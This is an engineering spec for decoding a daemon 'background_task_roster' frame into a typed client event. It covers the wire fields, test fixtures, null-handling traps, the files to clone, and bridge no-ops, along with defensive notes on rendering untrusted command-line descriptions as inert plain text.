# Spec: Background-task roster — decode the daemon `background_task_roster` frame into a typed `backgroundTaskRoster` event (#566)

**Size:** S (held — PO's `size:s` verified, see § Scope note) · **Security-sensitive:** yes · Split from
#554 · Siblings shipped: #564 (`background_task_started`, `dbb163e`) and #565 (`background_task_updated`,
`28204e7`) · Store consumer: #567 · Panel: #568

## Context

The two shipped siblings report what happened to **one** task. This frame reports **what is alive** — the
aggregate peer, and the one that carries the payoff of the whole family. An empty roster is the *positive*
statement that nothing is running, which is exactly the signal pyrycode#1240's symptom needs: a `turn_end`
carrying `end_turn` while a command claude started is provably still alive is otherwise indistinguishable
from a genuine finish. Today this frame reaches the client and is dropped as an unmodeled type.

**The lane is the mobile v2 stream over Noise + relay — not ACP.** The daemon fans all three background-task
frames to `interactive`-capable clients on the v2 lane (pyrycode#1394, shipped 2026-08-08); this app
advertises `interactive` (#179). An earlier framing assumed delivery over `pyry acp`; that surface was
retired (pyrycode#1348) and `internal/acpbridge` no longer exists in the daemon tree.

This slice is the **decode half only**, and it ships **dormant**: no renderer surface consumes the event.
The store that assembles the three frames into "what is running right now" is **#567**; the panel is **#568**.

**This is the third clone of a shape that is now settled in-tree.** `types.ts:73-76` already names this
ticket as the third member the `EnvelopeType` union is waiting for, and `requireStringArrayOrNull`'s
docstring (`inboundMessage.ts:315-331`) names it verbatim as a carrier of the identical `truncated_fields`
contract. Unlike the two siblings, this frame carries a **nested row array**, so it clones from *two*
templates: the siblings for the seven-file seam, and `queue_state` / `QueuedItem` / `parseQueuedItem` for
everything about the rows.

### Wire facts — mirror the daemon field-for-field, do not drift (CLAUDE.md / ADR 0002)

SSOT: pyrycode `docs/protocol-mobile.md:779-845` § `background_task_roster`,
`internal/protocol/interactive.go:242` (`BackgroundTaskRosterPayload`) and `:313` (`BackgroundTask`), fixtures
`internal/protocol/testdata/background_task_roster.json` and `background_task_roster_empty.json`. All verified
against the daemon tree 2026-08-19.

- **Type string:** `background_task_roster`.
- **Frame payload — THREE fields, Go declaration order:**

  | Wire field | Go type / tag | Notes |
  |---|---|---|
  | `conversation_id` | `string` | Conversation the roster belongs to. |
  | `tasks` | `[]BackgroundTask`, tag `json:"tasks"` — **no `omitempty`, and a custom `MarshalJSON`** | The tasks claude is tracking at this moment, in claude's own order. **Always present, never `null`.** |
  | `dropped_tasks` | `int`, tag `json:"dropped_tasks"` — **no `omitempty`** | Entries claude sent beyond the daemon's cap that this frame does **not** carry. `0` when nothing was dropped. |

- **Row (`BackgroundTask`) — FOUR fields:**

  | Wire field | Go type / tag | Notes |
  |---|---|---|
  | `task_id` | `string` | Join key back to the `background_task_started` that opened the task. |
  | `task_type` | `string` | claude's kind (`local_bash` the only observed value). |
  | `description` | `string` | The task's label, under a **tighter** cap than the scalar frame's. |
  | `truncated_fields` | `[]string` — **no `omitempty`** | Names of **this row's** cut fields (`task_id` / `task_type` / `description`). `null` when nothing was cut. Each row reports its own; there is no hoisted or flattened list. |

- **Canonical fixtures** (use both verbatim as test seeds — the full one is deliberately adversarial):

  ```json
  {"conversation_id":"c1","tasks":[
    {"task_id":"task_01ABC","task_type":"local_bash","description":"grep -rn 'a<b&c' .","truncated_fields":["description"]},
    {"task_id":"task_02DEF","task_type":"local_bash","description":"sleep 300","truncated_fields":null}],
   "dropped_tasks":3}
  ```
  ```json
  {"conversation_id":"c1","tasks":[],"dropped_tasks":0}
  ```

  Note the daemon's choices: two rows with **different** `truncated_fields` shapes (a populated list and a
  literal `null`) in one frame, a non-zero `dropped_tasks`, and a first `description` carrying HTML
  metacharacters (`a<b&c`) **deliberately**, not incidentally. The empty fixture is the AC2 signal case.

- **No `turn_id`; opens and closes no turn.** Same as both siblings.
- Binary → client only, `interactive`-gated, carries an envelope-level `event_id`.
- **Snapshot, not a delta.** Each frame replaces your view of what is running; it never amends it.
- **Producer caps (verified, for context only — do NOT mirror them client-side):**
  `maxTaskRosterEntries = 8` and `maxTaskRosterDescription = 512` (`internal/streamsup/parser.go:155,177`).
  The entry cap is what `dropped_tasks` counts against (`parser.go:1006-1008`). A client-side mirror of either
  would fail-close a valid future frame the day the daemon raises them; the frame-level
  `MAX_PLAINTEXT_BYTES` guard is the client's bound. Recorded so a reader knows the roster is bounded, not so
  anyone enforces it here.
- **No terminal / finish / completion event exists in this family, deliberately.** A task's disappearance
  from a later roster is the available finish signal, but that transition has never been observed and the
  daemon does not report a finish it cannot detect. Diffing snapshots is a legitimate **client** conclusion —
  #567's, not this slice's, and never something the wire reports.

### The four traps specific to this frame

1. **THE TRAP — `tasks: null` must FAIL CLOSED while a row's `truncated_fields: null` is a VALID VALUE.**
   Same frame, opposite contracts, and they look like the same shape. The developer arriving here has just
   shipped `requireStringArrayOrNull` **twice** for this family, so the nullable-array reflex is primed and
   wrong for `tasks`. The daemon settles it explicitly: `BackgroundTaskRosterPayload` carries the file's
   **only** custom `MarshalJSON` (`interactive.go:274`), whose entire job is normalising a nil `Tasks` to `[]`
   so an empty roster never serialises as `null` — and whose comment states that `truncated_fields` is
   deliberately **not** normalised the same way, because nil and `[]` say the identical thing there while
   `tasks` is the frame's subject and its empty value is the signal. See § Design 2b.
2. **The row is FOUR fields, and they are NOT the sibling's four.** `BackgroundTask` is `task_id`,
   `task_type`, `description`, `truncated_fields` — the daemon's comment is explicit that there is **no
   `tool_call_id` and no `patch`**, which the scalar frames carry because their *lines* do. A row narrower
   cloned from `parseBackgroundTaskStartedPayload` would wrongly require `tool_call_id` and fail-close every
   valid roster. Clone `parseQueuedItem`'s **posture**, never `parseBackgroundTaskStartedPayload`'s **shape**.
3. **`dropped_tasks` is the roster's ONLY truncation report.** There is deliberately no top-level
   `truncated_fields` on this frame, so a reader grepping for that name finds nothing and would silently
   believe a capped roster is the whole roster. The roster's true size is `len(tasks) + dropped_tasks`.
4. **`0` is a value, and `requireNumber` is correct precisely because there is no `omitempty`.** The key is
   always written on the wire, so an absent key is a real defect rather than a valid zero. Had the Go field
   carried `omitempty`, AC3's "0 is carried as 0" would have been unbuildable — a valid zero-drop frame would
   arrive key-absent. It does not; `requireNumber` (`inboundMessage.ts:282`) admits `0` free and never
   range-checks, which is the house precedent.

## Design source

N/A — pure transport / decode slice; the event ships **dormant** with zero rendered surface (AC5 pins that no
timeline item is created). The Figma file is the *mobile* design (`g2HIq2UyPhslEoHRokQmHG`) and contains **no
background-task panel** — the surface is desktop-only and has no counterpart there by construction; that gap
belongs to #568. The visual-fidelity check is intentionally skipped for this ticket.

## Files to read first

Codegraph is **not initialized** in this repo (`codegraph_status` returns *"CodeGraph not initialized for this
project"*, re-verified 2026-08-19) — this list was built from direct Read/grep against `main` at `6265de3`.
Line numbers are from that commit; re-grep if they drift.

**Read `git show 28204e7` end-to-end first, then `git show dbb163e`.** Every edit below has a counterpart one
and two commits old. Read the counterpart, then write this frame's twin.

| Path (with lines) | What to extract |
|---|---|
| `docs/specs/architecture/565-background-task-updated-decode.md` | The end-to-end template, including the scope-note reasoning and the security-review shape. This spec is its aggregate peer. |
| `src/shared/wire/types.ts:73-80` | The `EnvelopeType` slot — the existing comment at :73-76 already forward-references this ticket. Add `'background_task_roster'` directly after `'background_task_updated'` (:80). |
| `src/shared/wire/types.ts:430-488` | `BackgroundTaskUpdatedPayload` + its 52-line doc-comment — the interface and comment template. **Four flat fields; yours is three plus a nested row array.** |
| `src/shared/wire/types.ts:604-635` | **`QueuedItem` + `QueueStatePayload`** — the nested-row-type template. Note the row type is exported, its fields stay **snake_case**, and the parent holds `queued: QueuedItem[]`. This is the shape to mirror, not the scalar siblings'. |
| `src/main/transport/inboundMessage.ts:266` | `isRecord` — the record guard both narrowers open with. |
| `src/main/transport/inboundMessage.ts:279-288` | `requireNumber` — `typeof === 'number'`, so `0` passes free and nothing is range-checked. This is why `dropped_tasks` needs no special case (AC3). |
| `src/main/transport/inboundMessage.ts:315-349` | **`requireStringArrayOrNull`** — read the docstring, which names this ticket. Call it **per row**; do not write a second, narrower, or variant. |
| `src/main/transport/inboundMessage.ts:798-836` | **`parseQueuedItem` + `parseQueueStatePayload`** — the two templates that matter most. `parseQueueStatePayload:831-835` is the exact `tasks` shape: `const raw = payload.queued; if (!Array.isArray(raw)) throw; …raw.map(parseQueuedItem)`. **`Array.isArray(null)` is `false`, which is what makes `tasks: null` fail closed.** |
| `src/main/transport/inboundMessage.ts:621-668` | `parseBackgroundTaskUpdatedPayload` + doc — the frame-level template. Read it for the docstring discipline, **not** for the field list. |
| `src/main/transport/inboundMessage.ts:128-148` | The `background-task-started` / `-updated` paragraphs on the `InboundDaemonMessage` union doc-block — the comment-discipline template. |
| `src/main/transport/inboundMessage.ts:237-238` | The union arms `{ kind: 'background-task-started' … }` / `{ kind: 'background-task-updated' … }` — the new arm's neighbours. |
| `src/main/transport/inboundMessage.ts:1251-1265` | `case 'background_task_updated'` — the narrow-before-log block to clone, including its no-content-in-the-log comment. |
| `src/main/transport/inboundMessage.ts:27, 163` | The frame-level `MAX_PLAINTEXT_BYTES` guard and the in-file note that it backstops the oversized case — mirror the reliance, do **not** add a per-field or per-row length/count check. |
| `src/main/diagnosticLog.ts:39-48` | `DiagnosticEvent` — `code?: string` is open, so `code: 'background_task_roster'` needs **no** type widening. Confirms the content-free field set. |
| `src/shared/ipc/events.ts:207-241` | The `backgroundTaskUpdated` `DaemonEvent` arm + its 28-line doc — the template, and the load-bearing **KEEP-`conversationId`** precedent stated in-family. |
| `src/shared/ipc/events.ts:22, 327-336` | **The `queueState` arm** — `queued: readonly QueuedItem[]`, reusing the wire row type verbatim, plus the `QueuedItem` import at :22. This is the nested-array precedent the roster arm follows. |
| `src/main/daemonConnection.ts:711-739` | `case 'background-task-updated'` emit — the fresh-named-literal posture, the KEEP-`conversation_id` comment, the stateless/no-join comment, and the explicit note that **this inner switch has no `assertNever`** (a wrong emit compiles silently). |
| `src/main/daemonConnection.ts:826-839` | `case 'queue-state'` emit — the nested-array precedent: the already-narrowed row array passes through **by reference**, with **no snake→camel on the row**. |
| `src/renderer/src/store/daemonEventBridge.ts:150-161` | The two per-arm explicit `return null` blocks with their one-line "why" — clone and retarget. |
| `src/renderer/src/store/modalBridge.ts:98-118` | The no-op fall-through cluster; `backgroundTaskStarted`/`Updated` at :98-99 and the trailing comment names them at :113-117. Join both. |
| `src/renderer/src/store/timelineBridge.ts:158-190` | The no-op fall-through cluster; the two background-task arms at :158-159, their rationale at :183-189. **Do not copy `apiRetry` / `compacting` / `stallDetected`** — those are *owned* arms elsewhere in this file. |
| `src/main/transport/inboundMessage.test.ts:154-156, 179-181` | `encodeQueueState` / `encodeBackgroundTaskUpdated` helpers — clone as `encodeBackgroundTaskRoster` (next free envelope `id`). |
| `src/main/transport/inboundMessage.test.ts:254-265, 294-301` | The `BACKGROUND_TASK_UPDATED` and `QUEUE_STATE` fixtures — the two seeds to combine into `BACKGROUND_TASK_ROSTER` (+ an empty-roster constant). |
| `src/main/transport/inboundMessage.test.ts:1841-1933` | The `background_task_updated` recognition describe — `truncated_fields` null/empty/multi/future-name cases and unknown-keys-tolerated (:1917). |
| `src/main/transport/inboundMessage.test.ts:1935-2000` | The fail-closed describe — the per-field absent/mistyped loops and the non-object cases. |
| `src/main/transport/inboundMessage.test.ts:2242-2300` | **The `queue_state` recognition describe** — the nested-array assertions to mirror: per-row field extraction (`queued.map(q => q.text)`), `typeof` pin on the numeric field, and the **empty-array** case at :2266. |
| `src/main/transport/inboundMessage.test.ts:2286-2360` | The `queue_state` fail-closed describe — including the **one-bad-row** case and the oversized-plaintext case. |
| `src/main/transport/inboundMessage.test.ts:2979-3015` | The `background_task_updated` content-free diagnostic test **and** its "does NOT log on a malformed throw path" twin — both must be cloned. |
| `src/main/transport/inboundMessage.test.ts:3130-3164` | The `queue_state` content-free test — the model for asserting a **row-borne** secret never reaches the log, and the exact `Object.keys(record).sort()` set. |
| `src/main/daemonConnection.test.ts:302, 357` | `backgroundTaskUpdatedPlaintext` / `queueStatePlaintext` helpers — clone as `backgroundTaskRosterPlaintext`. |
| `src/main/daemonConnection.test.ts:1977-2120` | The `background_task_updated` round-trip describe: `drivers[0].emit({ type: 'message', plaintext })` against a `connected()` fixture, including the anti-smuggling case (:2072) and the never-opened-`task_id` case (:2096). **This is the harness — there is no `fakeDaemon` here.** |
| `src/main/daemonConnection.test.ts:2684-2740` | The `queue_state` round-trip block — including the **empty-array** emit at :2712. |
| `src/renderer/src/store/daemonEventBridge.test.ts:305-325` | The per-arm `.toBeNull()` block — clone one. |
| `src/renderer/src/store/modalBridge.test.ts:188-200` | The inverse-filter `others` array entry — append the new arm with its "ships dormant; its consumer is #567" comment. |
| `src/renderer/src/store/timelineBridge.test.ts:303-319` | The `others` array entry for `backgroundTaskUpdated` — the exact model. |
| `src/renderer/src/store/timelineBridge.test.ts:570-588` | **AC5's store-level pin** — the `#565: … creates NO timeline item` test, using the referential-no-op pattern (**both** halves). Clone it. |
| `src/shared/wire/types.test.ts:14-15, 235-280` | The compile-only `EnvelopeType` admission block + the payload-shape block. Note: vitest strips types, so these are **compile-only RED** — `npm run typecheck` fails, not `npm test`. |
| `CLAUDE.md` (§ Wire protocol, § Don't) | The no-drift rule that forbids narrowing `task_type` or the `truncated_fields` element names. |

## Scope note — why this ships as one `s` despite 7 production files and ~800 projected lines

Recorded at face value, not re-counted under any line.

| Red line | This ticket | Verdict |
|---|---|---|
| > 3 **new** files | **0 new files** — every edit is additive to an existing module | clear |
| > ~600 total LOC | **~800 projected** (see below) | **OVER** — held, see the proof and the evidence |
| > 5 new exported types | **2** — `BackgroundTaskRosterPayload`, `BackgroundTask` | clear |
| > 10 consumer call sites | **4** — 1 emit + 3 compile-forced bridges. Zero external fan-out: the event ships dormant | clear |
| > 5 acceptance criteria | **exactly 5** | at the line, not over |
| > 10 reject branches | **exactly 10** reachable (3 new `throw` statements + 7 existing-helper call sites — enumerated in § Error handling) | at the line, not over |

**The projected total, measured rather than estimated.** `git show --shortstat <sha> -- src` gives **684
insertions / 13 files** for #564 (227 production / 457 test) and **710 / 13** for #565 (222 / 488). This frame
adds, over #565: one exported row interface (~4 lines + ~12 docstring), one row narrower (~10 + ~12
docstring), a longer frame docstring for the four traps, plus the row-level test matrix (per-row fail-closed
loops, one-bad-row-fails-the-frame, multi-row distinctness, empty roster, `tasks: null`). Projection:
**~265 production / ~535 test ≈ 800 total**. That is the family's largest instance and it is over the
guideline.

**Why it holds anyway — a compile-atomicity proof, not a judgment call.** A reviewer can falsify this in 30
seconds by deleting one bridge arm and running `npm run build`:

- A new `DaemonEvent` arm in `events.ts` **compile-forces** a case in all three exhaustive bridges via their
  `assertNever` guard (`daemonEventBridge.ts:178`, `modalBridge.ts:124`, `timelineBridge.ts:196`). Omitting
  any one fails `npm run build` — the QA gate. The three bridges are atomic with the arm.
- The transport decode (`types.ts`, `inboundMessage.ts`, `daemonConnection.ts`) exists *only* to feed that
  arm; a decode-without-arm child is dead code — a decoder whose `kind` is silently dropped, with no emit to
  test.
- The row narrower and `BackgroundTask` have exactly one caller, the frame narrower. Splitting them off
  yields a leaf with no caller and no observable behaviour.
- Every attempted split therefore yields either a dead-code sub-leaf **or** an arm-bearing child still at ≥5
  files. **No seam exists**, so the red line's only prescribed remedy is unavailable.

**And the shape has now shipped twice, clean.** `dbb163e` (684 lines) and `28204e7` (710 lines) — the two
immediately preceding tickets, the identical seven-file seam — were both developer-complete with zero
deviations and passed code-review with zero findings. That is measured outcome, not projection. The delta
this frame adds over them is a nested row array whose every element (`QueuedItem`, `parseQueuedItem`,
`parseQueueStatePayload`, and their three test blocks) already exists in-tree as a complete template, cited
line-by-line in § Files to read first.

**The turn-budget proxies the LOC line actually stands in for are all clear or at the line**: 0 new files, 2
new exported types, 4 consumer call sites, 10 reject branches, 5 ACs. The overage is doc-comment prose — this
codebase documents every wire decision at the decode site — written in the same Edit as the code it
annotates. **Turn-economy instruction to the developer:** do not derive the row narrower, the row type, or the
nested-array test cases. Clone `parseQueuedItem` / `QueuedItem` / the `queue_state` test blocks and retarget.

**File-overlap check (§ 1.5):** run 2026-08-19 after `git fetch origin --prune` against all 11
`origin/feature/*` branches for the 13 files this slice touches. **No overlap.** Siblings #567 / #568 have no
branches yet.

## Design

Seven production touch-points, mirroring #564 / #565 end-to-end. **No new files. No new helpers.**

### 1. Wire types — `src/shared/wire/types.ts`

**1a. `EnvelopeType`.** Add `'background_task_roster'` directly after `'background_task_updated'` (:80). The
block comment at :73-76 already forward-references this ticket ("#566's `background_task_roster` still joins
them here") — trim that phrasing now that the member has landed, and give the new member a short comment of
its own: the aggregate peer of the two above; a **snapshot, not a delta**; an empty `tasks` is the positive
"nothing is alive" statement. Keep the edit minimal — no restructuring of neighbouring members.

**1b. Row type.** Add an exported `BackgroundTask` interface — a contract sketch, mirroring `QueuedItem`
(:615) rather than the scalar payloads:

```ts
export interface BackgroundTask {
  task_id: string
  task_type: string
  description: string
  truncated_fields: string[] | null
}
```

Fields stay **snake_case** and the interface is **not** `readonly` — exactly `QueuedItem`'s posture. Mirror
it; do not improve on it. Field order mirrors `interactive.go:313`.

The doc-comment must record: that it is one row of a roster, with wire order and no `omitempty` on any field;
that it is **four fields and NOT the scalar siblings' four** — explicitly **no `tool_call_id`, no `patch`**,
because those ride the scalar frames' *lines*, and a row cloned from `BackgroundTaskStartedPayload` would
fail-close every valid roster; that `truncated_fields` names **this row's own** cut fields (`task_id` /
`task_type` / `description`), a **third** distinct set from #564's and #565's, which is itself the argument
against ever narrowing the element vocabulary; that `null` means nothing was cut and is distinct from `[]`,
never to be collapsed; that `task_type` is an **open string** (`local_bash` is one observation and one
observation does not earn an enum); and the SECURITY note below.

**SECURITY (row-level, stated per row rather than delegated):** `description` carries the same literal
command line as `background_task_started.description`, under a **tighter** producer cap — here it is one label
in a list whose length claude chooses, and the full-length copy already crossed the wire on the
`background_task_started` this row joins back to. Untrusted, model-influenced text: render as **inert plain
text only** — never execute, never re-shell, never feed to an HTML sink (`innerHTML` /
`dangerouslySetInnerHTML`), an attribute, or a URL. The daemon repeats this rule per row rather than
delegating it to the sibling **because a list of command lines is a more tempting shape to feed somewhere
structured than a single one**. Carry that reasoning into the comment, not just the rule.

**1c. Frame payload.** Add, doc-commented in the `BackgroundTaskUpdatedPayload` (:430) style:

```ts
export interface BackgroundTaskRosterPayload {
  conversation_id: string
  tasks: BackgroundTask[]
  dropped_tasks: number
}
```

`tasks` is **non-optional and non-nullable** — that is AC2's whole point, and it is the daemon's deliberate
contract, not an assumption. The doc-comment must record, at minimum:

- That it is the **aggregate peer** of the two scalar frames: they report what happened to one task, this
  reports what is alive.
- That it is a **snapshot, not a delta** — each frame replaces the reader's view of what is running, never
  amends it. The frame's name is the daemon's (named for the *trigger*), not claude's.
- **Why `tasks` is a plain array and never `string[] | null`-shaped**, with the daemon citation: this payload
  carries `interactive.go`'s **only** custom `MarshalJSON` (`:274`), whose entire job is normalising a nil
  `Tasks` to `[]` so an empty roster never serialises as `null`; `omitempty` is deliberately out because
  eliding the key would erase the frame's whole point. An empty `[]` is a **positive statement that nothing
  is alive** — the reassurance that a turn really is finished, not an absence of information. A client
  decoding into a non-optional array type never has to branch on `null`.
- **The contrast that is this frame's trap**, stated in the same comment so a reader meets both at once:
  within this one payload, `tasks: null` **fails closed** while a row's `truncated_fields: null` is a **valid
  value** — because the daemon's marshaller normalises the first and deliberately does not normalise the
  second (nil and `[]` say the identical thing for `truncated_fields`; `tasks` is the frame's subject and its
  empty value is the signal).
- That `dropped_tasks` is the **roster's only truncation report** — there is deliberately no top-level
  `truncated_fields` here, so a reader grepping for that name finds nothing and would silently believe a
  capped roster is the whole roster. **The roster's true size is `tasks.length + dropped_tasks`.** A count is
  carried rather than a name because a name-only report loses *how many* were lost; per-row text cuts are a
  property of one row and ride that row's own `truncated_fields`.
- That `dropped_tasks: 0` is a **value**, never consulted for truthiness, and that the absence of `omitempty`
  is what makes a plain `requireNumber` correct (§ trap 4).
- **NOT A TURN-STREAM ITEM**: no `turn_id`, opens and closes no turn — hence the emitted event **KEEPS**
  `conversation_id` (daemon state keyed by id) rather than dropping it like `api_retry` / `turn_state`.
- That **no terminal/finish event exists in this family by design**; "finished" is a client conclusion drawn
  from absence in a later roster, never something the wire reports — and drawing it is #567's call, not this
  slice's.

### 2. Inbound decode — `src/main/transport/inboundMessage.ts`

**2a. No new helpers.** `requireStringArrayOrNull` (:332) already encodes the per-row `truncated_fields`
contract and its docstring names this ticket. Call it **per row**. `requireNumber` (:282) already admits `0`
and never range-checks. `requireString` and `isRecord` are unchanged. **Do not add a second, narrower, or
variant of any of them.**

**2b. Row narrower.** Add, modelled on `parseQueuedItem` (:808):

```ts
function parseBackgroundTask(payload: unknown): BackgroundTask
```

Behaviour: `isRecord` guard (throws `WireDecodeError('malformed background task')` on a non-record), then
`requireString` for `task_id` / `task_type` / `description`, then `requireStringArrayOrNull` for
`truncated_fields`. Returns a **fresh four-field literal** — unknown server-added keys tolerated
(forward-compat) but never copied through, which also makes it prototype-pollution-safe.

Docstring must state: the posture is `parseQueuedItem`'s (one bad element throws the **whole payload** closed,
never a partial roster; an empty parent array is valid; the result is a fresh literal); the field list is
**not** `parseBackgroundTaskStartedPayload`'s (no `tool_call_id`, no `patch` — cloning that narrower's shape
would fail-close every valid roster); no closed-set validation of `task_type` or of the `truncated_fields`
element names; and the message names the failure **category only** — `description` is a command line and the
ids are correlating identifiers.

**2c. Frame narrower.** Add next to `parseBackgroundTaskUpdatedPayload` (:655):

```ts
function parseBackgroundTaskRosterPayload(payload: unknown): BackgroundTaskRosterPayload
```

Behaviour, in wire order: `isRecord` guard (throws
`WireDecodeError('malformed background_task_roster payload')`), `requireString` for `conversation_id`, then
**`tasks` takes `parseQueueStatePayload`'s inline shape verbatim** (`inboundMessage.ts:831-835`) —

- read `payload.tasks` into a local,
- `if (!Array.isArray(raw)) throw new WireDecodeError('malformed tasks list')`,
- `raw.map(parseBackgroundTask)`,

— then `requireNumber` for `dropped_tasks`. Returns a fresh three-field literal.

**This is the trap, and the docstring must say so explicitly.** `Array.isArray(null)` is `false`, which is
precisely what makes `tasks: null` fail closed, and an omitted key (`undefined`) fails the same way. That is
the **opposite** contract from the per-row `truncated_fields` in the same frame, where a literal `null` is a
valid value returned as `null`. Both facts, and the daemon's `MarshalJSON` reason for the asymmetry, belong in
the docstring — a developer arriving from #564/#565 has shipped `requireStringArrayOrNull` twice and the
reflex to reach for it here is primed and wrong.

Also in the docstring: an **empty** `tasks` array is valid and decodes to `[]` (`[].map()` → `[]`), the AC2
signal case; order is preserved from the wire (claude's own order); `dropped_tasks: 0` is carried as `0` with
**no truthiness test and no range check** (a client-invented bound would silently drop valid future frames —
the `requireNumber` house posture since #116); and no cross-check between `dropped_tasks` and `tasks.length`.
Messages name the failure category only.

**No per-row or per-roster count/length check.** The daemon bounds the entry count at construction
(`maxTaskRosterEntries`) and each string at its own cap, and the frame-level `MAX_PLAINTEXT_BYTES` guard
already fails an oversized frame closed before this arm runs — the same reliance `queue_state` /
`background_task_started` / `background_task_updated` have. Mirror, do **not** add.

**2d. Inbound arm.** Import `BackgroundTaskRosterPayload` (and `BackgroundTask` if referenced); add to
`InboundDaemonMessage` beside :238:

```ts
| { kind: 'background-task-roster'; backgroundTaskRoster: BackgroundTaskRosterPayload }
```

Hyphenated `kind`, matching `background-task-started` / `background-task-updated` / `queue-state`. Extend the
union's doc-comment block in the two background-task paragraphs' style (:128-148): what the frame is
(aggregate peer, snapshot not delta), that the consumer carries **all three fields onward, `conversation_id`
included**, and that the fail-closed defence is one required string, one required **array** (never null), one
required number, and a per-row narrower that fails the whole frame on one bad row.

**2e. Type-switch arm.** Add `case 'background_task_roster':` to `parseInboundMessage` beside :1251, cloning
that block: **narrow before logging** (so a malformed frame throws before any record is written), then
`diagnosticLog?.event({ event: 'inbound-decoded', code: 'background_task_roster', bytes: plaintext.length, hash: hashPlaintext(plaintext) })`,
then `return { kind: 'background-task-roster', backgroundTaskRoster }`.

**Log nothing but the existing content-free field set.** No decoded field may be added to the record — least
of all a row `description`, which is a command line. **And deliberately no `count`** — note this is a real
restraint, not a vacuous one: `DiagnosticEvent` **already has a `count?: number` field**
(`diagnosticLog.ts:48`), so emitting the roster size would cost nothing structurally and is omitted on
purpose. The roster size is itself a fact about the user's session, and the `queue_state` /
`conversation_created` posture is to omit it (`inboundMessage.test.ts:3149` asserts the exact key set with no
count). `code?: string` (`diagnosticLog.ts:43`) is already open, so **no `DiagnosticEvent` widening is needed
or permitted** — a widening would also disturb #131's renderer pin.

### 3. Typed event — `src/shared/ipc/events.ts`

Import `BackgroundTask` alongside `QueuedItem` (:22). Add the arm to `DaemonEvent`, after the
`backgroundTaskUpdated` arm (:235-241):

```ts
| {
    type: 'backgroundTaskRoster'
    conversationId: string
    tasks: readonly BackgroundTask[]
    droppedTasks: number
  }
```

**Top-level fields snake→camel; the ROW type is reused verbatim with snake_case fields.** This is not an
inconsistency to fix — it is the settled house rule for nested arrays, with two precedents: `queueState`
(`queued: readonly QueuedItem[]`, :336) and `conversationsReceived`. `daemonConnection.ts:830-831` states the
reason in-tree: the row narrower already stripped each row to its known fields, so there is nothing to drop
and no mapping to write. `readonly` on the array mirrors `queueState`; the row interface itself stays mutable,
exactly like `QueuedItem`. **Do not camel-case the rows** — that would fork the row type, add a mapping loop,
and diverge from both precedents for no gain.

Doc-comment it in the sibling arms' style (:173, :207), recording: that it is the **aggregate peer** of the
two arms above — they report one task, this reports the whole live set; that it is a **snapshot, not a
delta**, so #567 replaces its held set rather than merging; that `tasks: []` is a **positive statement that
nothing is alive** and must be emitted, never dropped or filtered — the payoff signal for pyrycode#1240;
that it carries **`conversationId`** and why (§ 4); that `droppedTasks` is the **only** truncation report on
this frame, that the true roster size is `tasks.length + droppedTasks`, and that `0` is a value never
consulted for truthiness; that each row's `truncated_fields: null` means nothing was cut for **that row**, is
distinct from `[]`, and is per-row with no hoisted or flattened list; that `task_type` is an open string; the
**SECURITY** constraint that each row's `description` is UNTRUSTED, model-influenced daemon-relayed text and
for `task_type: local_bash` **is the literal command line claude ran** — render as **plain text, NEVER HTML**
(no `innerHTML` / `dangerouslySetInnerHTML`), never into an attribute or a URL, never executed or re-shelled,
with the daemon's stated reason that a **list** of command lines is a more tempting shape to feed somewhere
structured than a single one; that no token, key, or raw frame can ride the arm (one id, a bounded list of
four-field rows, and a count is the whole payload); and that it ships **dormant** — all three exhaustive
bridges no-op it until #567.

### 4. Emit — `src/main/daemonConnection.ts`

Add `case 'background-task-roster':` to the `switch (inbound.kind)` dispatch, beside :711:

```ts
emitDaemonEvent(sink, {
  type: 'backgroundTaskRoster',
  conversationId: inbound.backgroundTaskRoster.conversation_id,
  tasks: inbound.backgroundTaskRoster.tasks,
  droppedTasks: inbound.backgroundTaskRoster.dropped_tasks
})
```

**A fresh named-field literal at the top level, never a spread** of `inbound.backgroundTaskRoster`. This is the
anti-smuggling net: a decoder that later grows a field cannot ride across IPC without an explicit edit here.
`tasks` passes the already-narrowed row array **by reference** — `parseBackgroundTask` returned fresh
four-field literals, so there is nothing left to strip; this is exactly the `queued` precedent at :834-838,
including **no snake→camel and no per-row re-literal**. An empty `tasks` array emits normally; it is never
filtered, coalesced, or treated as "nothing to report".

**`conversation_id` is KEPT.** Settled in-family, not argued fresh: both sibling emits keep it, and
`events.ts:211-214` records the rule — the test is *"turn-stream item, or daemon state?"*, this frame carries
no `turn_id` and opens and closes no turn, so it follows the `queue_state` rule (#720) rather than the
`api_retry` / `turn_state` drop. #567 attributes by id, so dropping it here would make that slice unbuildable
without reopening this one. Do not re-argue it.

**Not compile-forced.** This inner switch has no `assertNever` default (:652 states it), so a missing or wrong
emit compiles silently and drops the decoded kind. The round-trip tests (§ Testing strategy) are the **only**
guard on this leg and are not optional.

Comment it in the sibling arms' style, including the stateless rule below.

### 5-7. Exhaustive bridge no-ops (compile-forced)

Each of `daemonEventBridge.ts`, `modalBridge.ts`, `timelineBridge.ts` switches exhaustively over `DaemonEvent`
with an `assertNever` default; the new arm is a compile error in all three until each gets a case. Add
`case 'backgroundTaskRoster': return null` in each file's existing house style, in every instance directly
alongside the `backgroundTaskUpdated` arm #565 added:

- **`daemonEventBridge.ts` (:156)** — a per-arm explicit block with a one-line "why": the background-task
  store **#567**, not yet built, holds the live task set; the session store holds no background-task state at
  all.
- **`modalBridge.ts` (:99)** — join the fall-through cluster and extend the trailing comment (:113-117) to name
  the arm: ships dormant, consumer is #567, and a snapshot of what claude left running is not a modal —
  nothing is waiting on an answer.
- **`timelineBridge.ts` (:159)** — join the no-op fall-through cluster and extend the trailing comment
  (:183-189). **Do not copy `case 'apiRetry'` / `case 'compacting'` / `case 'stallDetected'`** — all are
  *owned* arms elsewhere in this file that return a `ThreadEvent`. The model is the adjacent
  `backgroundTaskStarted` / `backgroundTaskUpdated` / `queueState` rationale: daemon STATE, not a turn-stream
  item; and here the wire says so outright — no `turn_id`, opens and closes no turn. Whether the
  background-task panel ever becomes a timeline surface is **#568's** call.

No behaviour anywhere; the first consumer is #567.

### Non-goals, named so they are not re-litigated

- **`event_id` needs no work.** `codec.ts` already decodes the envelope-level `event_id` generically into the
  optional `Envelope.event_id`, and this app advertises no `last_event_id` in `hello`, so there is no replay
  path to plumb. Do not touch it.
- **No generic "background-task frame" abstraction.** With the third instance in hand and each of the three
  carrying a *different* field set, the seam is already clone-friendly and the one thing worth factoring out
  (`requireStringArrayOrNull`) was factored out by #564. Building an abstraction now is speculative
  generality.
- **No join, no buffering, no dedup, no client-side state.** § State model.
- **No snapshot diffing, no "finished" inference.** There is no terminal event in this family by design;
  concluding a task finished from its absence in a later roster is #567's call and requires holding the
  previous roster — which this slice must not do.
